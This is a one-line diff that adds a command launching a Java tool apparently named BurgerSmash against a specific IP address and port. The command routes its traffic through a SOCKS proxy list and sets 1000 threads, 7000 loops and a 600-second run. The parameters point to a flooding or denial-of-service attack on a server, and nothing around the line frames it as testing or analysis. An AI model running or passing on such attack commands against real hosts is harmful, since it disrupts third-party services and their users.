@@ -1,0 +1,1 @@
+java -jar BurgerSmash-0.1.jar host-51.79.97.73 port-41133 file-tr.txt proxymode-socks threads-1000 loop-7000 debug-true time-600
